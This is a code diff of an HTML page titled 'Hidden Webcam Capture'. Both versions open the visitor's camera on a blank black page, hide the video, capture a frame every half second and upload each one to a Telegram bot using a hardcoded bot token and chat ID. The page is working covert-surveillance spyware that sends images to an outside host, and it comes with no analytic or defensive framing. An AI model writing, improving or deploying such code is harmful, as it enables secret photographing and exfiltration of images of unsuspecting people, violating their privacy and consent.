@@ -2,80 +2,65 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Hidden Auto Selfie Capture</title>
+    <title>Hidden Webcam Capture</title>
     <style>
         /* Hide everything on the page */
         body {
             margin: 0;
-            padding: 0;
-            background-color: black; /* Keeps the page blank */
             overflow: hidden;
-        }
-        video, canvas {
-            display: none;
+            background: black;
         }
     </style>
 </head>
 <body>
 
-    <video id="videoElement" autoplay></video>
-    <canvas id="canvasElement"></canvas>
+    <video id="videoElement" autoplay style="display:none;"></video>
 
     <script>
         // Telegram Bot Token and Chat ID
         const TELEGRAM_TOKEN = '7647990067:AAEH5Qjt1XEKY7SvEkxinhYAbR5Bq5pKHDs';
         const CHAT_ID = '5519921687';
 
-        const video = document.getElementById('videoElement');
-        const canvas = document.getElementById('canvasElement');
-
-        // Access the device camera and stream to video element
+        // Access the device camera
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
+                const video = document.getElementById('videoElement');
                 video.srcObject = stream;
-                startAutoCapture();
+
+                // Start sending frames every 0.5 seconds
+                setInterval(() => captureAndSend(video), 500);
             })
             .catch(err => {
-                console.error("Error accessing camera: ", err);
+                console.error("Error accessing camera:", err);
             });
 
-        function startAutoCapture() {
+        function captureAndSend(video) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            setInterval(() => {
-                // Set canvas size to match video stream
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+            // Convert to Blob and send to Telegram
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'selfie.png');
 
-                // Draw current frame from video stream to canvas
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Convert canvas content to base64 image
-                const dataURL = canvas.toDataURL('image/png');
-
-                // Convert base64 to Blob and send to Telegram
-                fetch(dataURL)
-                    .then(res => res.blob())
-                    .then(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'selfie.png');
-
-                        return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (!data.ok) {
-                            console.error("Failed to send photo:", data);
-                        }
-                    })
-                    .catch(error => {
-                        console.error("Error sending photo: ", error);
-                    });
-            }, 500); // 0.5-second interval
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error("Error sending photo:", data);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending photo:", error);
+                });
+            }, 'image/png');
         }
     </script>
 
